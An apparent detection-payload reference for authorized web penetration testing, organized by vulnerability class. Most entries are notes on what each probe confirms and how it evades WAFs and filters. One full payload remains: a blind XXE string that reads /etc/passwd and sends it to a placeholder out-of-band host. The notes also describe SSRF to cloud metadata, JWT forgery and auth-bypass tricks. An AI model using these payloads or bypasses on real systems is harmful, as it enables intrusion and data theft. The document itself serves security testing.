_meta.description: Curated per-vuln-class DETECTION payload library. Read-only / non-destructive markers only. Drawn from public corpora (PayloadsAllTheThings, PortSwigger Web Security Academy research, publicly disclosed reports) — general public knowledge. For authorized testing only.
_meta.entry_shape: {payload, signal, note, waf_bypass} (+ optional engine for ssti). signal = the observable that confirms the bug.
_meta.oob_note: Payloads referencing OOB-HOST require an attacker-controlled collaborator endpoint you are authorized to use. Substitute before sending.

sql_injection.note: Single quote — breaks string context; look for SQL errors (SQLSTATE, 'unterminated quoted string', ORA-, 'You have an error in your SQL syntax').
Double quote for double-quoted string contexts (some MySQL/PostgreSQL configs).
Always-true tautology. Confirm with ' OR '1'='2 (false) and diff response length/row count.
Numeric-context true case; pair with 1 AND 1=2 (false). Content-length delta confirms.
MySQL time-based blind. Baseline with SLEEP(0); repeat to rule out network jitter.
MySQL subquery time-based — fires where a bare SLEEP() is filtered or optimized away.
Column-count probe. Add NULLs until the error clears to learn column count.
Banner extraction once column count and a string-typed column are known (MySQL/MSSQL).
MySQL error-based extraction via XPATH error; version() echoed after ~ in the error text.
Inline-comment whitespace substitution to evade naive space/keyword filters.
Tab/newline whitespace alternation to bypass WAF regexes expecting a literal space.
Mixed-case keyword to defeat case-sensitive keyword blocklists.
Combined case + inline-comment UNION SELECT obfuscation.

xss.note: Baseline reflection probe. Confirm tags render unescaped in HTML body context (not entity-encoded).
Breaks out of a double-quoted attribute value before injecting a script tag.
Single-quote attribute breakout + event-handler vector (no <script> needed).
Broken-image onerror handler — fires without a script tag; common when <script> is stripped.
Slash separator instead of space — bypasses filters keyed on 'svg '.
For href/src sinks and redirect params. Confirm it lands in an attribute that executes URIs.
Attribute-context injection that fires on autofocus with no user interaction.
Client-side template injection (AngularJS sandbox escape) — confirm a JS template framework is in use.
Alternative event handler when onload/onerror are filtered.
Mixed case to defeat case-sensitive tag blocklists.
HTML-entity-encoded handler body to bypass keyword filters scanning for literal 'alert'.
Polyglot (Heyes/0xsobky style) — fires across HTML, attribute, script, comment and URI contexts in one shot.
ontoggle auto-fires on a <details open> element; useful when img/svg are filtered.

ssti.note: Generic probe — JSP EL / Spring SpEL / FreeMarker / Mako. Output 49 indicates evaluation.
Jinja2 / Twig / Nunjucks. Output 49 = evaluation. Use {{7*'7'}} to disambiguate.
ERB (Ruby) / classic EJS. Output 49 confirms server-side evaluation.
Engine fingerprint: Jinja2 -> 7777777 (string repeat); Twig -> 49. Disambiguates Python vs PHP engine.
Hybrid brace-dollar probe; catches engines requiring either prefix (Twig/Smarty edge cases).
Smarty single-brace probe. Output 49 confirms Smarty (PHP).
Razor (ASP.NET) probe. Output 49 confirms server-side Razor evaluation.
Apache Velocity — assigns then prints 49 if evaluated.
Multi-engine polyglot — observe which delimiter yields 49 to fingerprint the engine in one request.
Jinja2 sandbox-escape recon — leaking the class confirms reach into the Python object model. Detection only.
SpEL type-reference recon — returning the OS name confirms Spring SpEL evaluation. Benign property read.

ssrf.note: AWS IMDSv1 metadata root. A meta-data directory listing confirms SSRF to cloud metadata.
AWS IAM role enumeration — stop at confirming reachability; do NOT exfiltrate the role/keys.
GCP metadata (needs header 'Metadata-Flavor: Google' for data; reachability alone is the SSRF signal).
Azure IMDS (needs header 'Metadata: true'). Reachability confirms SSRF.
Loopback probe — response/timing differing from an external host signals internal reachability.
Hostname loopback — catches filters that block the 127.0.0.1 literal but resolve localhost.
IPv6 loopback — bypasses IPv4-only SSRF blocklists.
Decimal-integer encoding of 127.0.0.1 — defeats string-match blocklists on '127.0.0.1'.
DNS-wildcard (nip.io) resolves to the literal IP — bypasses filters blocking only the raw 169.254.169.254 string.
Userinfo-confusion — parsers reading host before '@' allowlist the fake host while the request still hits metadata.
Double-encoded fragment/userinfo confusion to slip past allowlist validators.
gopher:// protocol smuggling against internal Redis/etc. DETECTION: a benign PING only — never write or modify data.

lfi.note: Unix traversal — 'root:x:0:0:' in the response confirms file read.
Doubled dot-slash that survives a single non-recursive '../' strip (collapses back to ../).
URL-encoded traversal to bypass filters scanning for literal '../'.
Double-URL-encoded traversal — for proxies/apps that decode twice.
Overlong UTF-8 encoding of '/' (legacy IIS/Tomcat) traversal bypass.
Null-byte truncation to drop an appended extension (old PHP < 5.3.4 and some other stacks).
Windows traversal — '[fonts]' / '[extensions]' section in win.ini confirms read.
PHP wrapper returns base64 of source — decode to confirm; non-destructive source disclosure.
ROT13 filter variant when base64 conversion is filtered.
Explicit file:// scheme — catches handlers that strip traversal but honor wrappers.
Process environment read — confirms LFI; detection only, do not harvest secrets.
Null-separated process args — alternative LFI confirmation on Linux.
Doubled-backslash Windows variant to survive single-pass '..\' stripping.

nosql_injection.note: MongoDB $ne (not-equal-null) as a JSON field — matches all docs, bypasses auth/filter.
$gt empty-string — true for all non-empty values; auth-bypass primitive.
Bracket form for x-www-form-urlencoded bodies parsed into objects (Express/qs).
Full login-bypass body — both fields always-true.
$regex anchored match — basis for blind char-by-char extraction (diff vs '^z' to detect).
MongoDB $where JS time-based blind. Baseline with sleep(0). Detection only, non-destructive.
$where boolean differential confirming server-side JS evaluation.
JS-context string-break for $where/eval injection (||'1'=='1' always true).
Comparison-against-undefined trick; alternative when $ne null is filtered.
$nin empty-array matches everything — filter/auth bypass when $ne is blocklisted.
$in operator injection — confirms object-operator parsing of user input.
$where JS-injection forcing a true return; detects server-side JS eval.

xxe.note: Classic in-band XXE — 'root:x:0:0:' echoed in the response confirms entity expansion + file read.
Windows in-band XXE — win.ini contents in the response confirm read.
PHP-filter-wrapped XXE — returns base64 (decode to confirm); needed when file content has XML-breaking chars.
Out-of-band parameter-entity XXE for blind cases — a callback to your authorized collaborator host confirms.
XXE-driven SSRF to cloud metadata — reachability is the signal; do not exfiltrate credentials.
External-DTD blind XXE skeleton — remote x.dtd defines the callback entity. Authorized collaborator host only.

xxe.payload: <!DOCTYPE root [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY % c SYSTEM 'http://OOB-HOST/?x=%a;'>">%b;%c;]>
xxe.note: Error/OOB nested parameter-entity exfil pattern for blind XXE where direct reflection is unavailable.
UTF-16 declaration to bypass naive WAFs that only scan UTF-8 ASCII signatures.
Java jar: protocol probe — distinctive parser error fingerprints a Java XML stack vulnerable to XXE.
DETECTION REFERENCE — PHP expect:// wrapper RCE indicator (rarely enabled). Uses benign 'id'.

open_redirect.note: Baseline absolute URL — a 30x Location to a domain you control confirms open redirect.
Protocol-relative — browsers treat // as scheme-relative; bypasses validators requiring 'http'.
Backslash variant — many parsers normalize \ to / so this becomes //host.
Suffix-confusion — bypasses allowlists doing a naive startswith/contains 'trusted.com'.
Allowlisted token in the query string fools 'contains(trusted.com)' checks.
Fragment-confusion variant of the contains-check bypass.
Userinfo-confusion — trusted.com is the username, the real host is evil.example.com.
Missing-slashes scheme — some browsers still navigate; bypasses '//' blocklists.
Multiple leading slashes collapse to // in some normalizers, bypassing single-// filters.
URL-encoded protocol-relative — for params decoded once before the redirect check.
Encoded path-confusion to defeat suffix-allowlist validators.
If the redirect sink writes the value into href/location without scheme validation this escalates to XSS — detection only.

command_injection.note: BENIGN marker — semicolon separator; 'uid=...gid=...' in output confirms execution. No system change.
Pipe separator variant — benign id marker.
Ampersand separator (Windows & Unix). whoami output is a benign identity marker.
AND-chained benign marker — runs only if the prior command succeeds.
Backtick command substitution — benign id marker.
Dollar-paren command substitution — benign id marker; modern-shell equivalent of backticks.
Newline (URL-encoded LF) injection — benign id; bypasses filters blocking ;|& but not line breaks.
Blind/time-based confirmation when output is not reflected. Benign — baseline with sleep 0.
Out-of-band DNS/ICMP confirmation for blind cases. Single benign packet to an authorized collaborator host only.
${IFS} substitutes a space — bypasses filters blocking literal spaces. Benign id marker.
Backslash inside the command name evades naive keyword filters on 'id' while the shell still runs id. Benign.
Quote-insertion obfuscation reads a benign non-sensitive file (hostname) to confirm RCE without touching secrets.

jwt.note: alg:none header — re-encode with an empty signature; acceptance means signature verification is disabled. Forge with unchanged claims first to confirm.
Case variation of alg:none — bypasses libraries blocklisting only lowercase 'none'.
RS256->HS256 confusion: sign with the RSA public key as the HMAC secret. If the public key is known and the server verifies HS256 with it, forgery succeeds.
kid path-traversal to a predictable/empty key file (/dev/null -> empty key) enabling forgery. Detection only.
kid SQL-injection — if the key is looked up via SQL, inject to control the returned signing key.
jku pointing at an attacker-hosted JWKS — if fetched unvalidated, attacker controls the verification key. A callback confirms. Authorized host only.
Embedded JWK — if the verifier trusts a key embedded in the header, sign with your own keypair to forge. Detects header-injected-key trust.
Claim-tamper probe paired with offline HMAC brute force (common weak secrets / wordlist). A crack confirms a weak-key vuln. Detection only.
Full forged-token shape for alg:none privesc test (base64url header.claims + empty signature). Confirmed by an accepted elevated claim.

cors.note: Arbitrary attacker Origin reflected in Access-Control-Allow-Origin (esp. with Allow-Credentials: true) = credentialed cross-origin read.
ACAO: null accepted — exploitable from sandboxed iframes / data: URIs.
Suffix-match bypass: app allows *.target.example but reflects an attacker domain that merely contains it.
